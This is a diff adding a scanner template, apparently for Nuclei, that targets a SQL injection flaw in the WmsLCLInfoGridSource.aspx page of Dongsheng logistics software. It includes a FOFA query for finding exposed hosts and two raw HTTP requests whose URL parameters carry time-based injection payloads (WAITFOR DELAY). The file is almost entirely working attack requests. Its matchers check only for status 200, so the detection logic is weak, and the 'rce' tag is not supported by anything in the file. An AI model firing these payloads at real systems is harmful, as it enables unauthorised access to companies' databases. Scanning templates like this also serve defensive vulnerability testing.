@@ -1,0 +1,58 @@
+id: poc-iuhro4uk9l8oxd8h
+info:
+  name: 东胜物流软件WmsLCLInfoGridSource.aspx存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iuhro4uk9l8oxd8h'
+  tags: rce,sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: iuhro4uk9l8oxd8h
+    fofa: body="CompanysAdapter.aspx"
+http:
+- raw:
+  - 'GET /SeaiInfoLCL/WmsLCLInfoGridSource.aspx?read=isout&gids=-1%27)%3BWAITFOR+DELAY+%270%3A0%3A5%27--+ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Content-Type: application/json
+
+    Accept-Encoding: gzip, deflate
+
+    Upgrade-Insecure-Requests: 1
+
+    Priority: u=0, i'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /SeaiInfoLCL/WmsLCLInfoGridSource.aspx?read=goodsrksl&goodsrksl=&goodname=-1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--+ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Content-Type: application/json
+
+    Accept-Encoding: gzip, deflate
+
+    Upgrade-Insecure-Requests: 1
+
+    Priority: u=0, i'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
